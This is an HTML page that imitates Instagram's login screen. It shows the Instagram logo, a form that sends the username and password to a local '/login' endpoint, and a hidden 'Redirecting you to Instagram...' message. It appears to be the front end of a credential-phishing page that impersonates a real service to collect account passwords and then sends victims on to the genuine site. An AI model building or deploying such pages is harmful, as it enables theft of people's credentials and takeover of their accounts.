<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

    <!-- Login Form Section -->
    <div class="login-container" id="login-section">
        <div class="login-card">
            <h1 class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
            </h1>
            <!-- Updated form action -->
            <form class="login-form" action="/login" method="POST">
                <div class="input-group">
                    <label for="username">Phone number, username, or email</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="btn">Log In</button>
            </form>
            <div class="signup-link">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
        </div>
    </div>

    <!-- Success Message Section (hidden by default) -->
    <div class="login-container" id="success-section" style="display:none;">
        <div class="success-container">
            <h1 class="success-message">You have logged in successfully!</h1>
            <p class="redirect-message">Redirecting you to Instagram...</p>
        </div>
    </div>

</body>
</html>
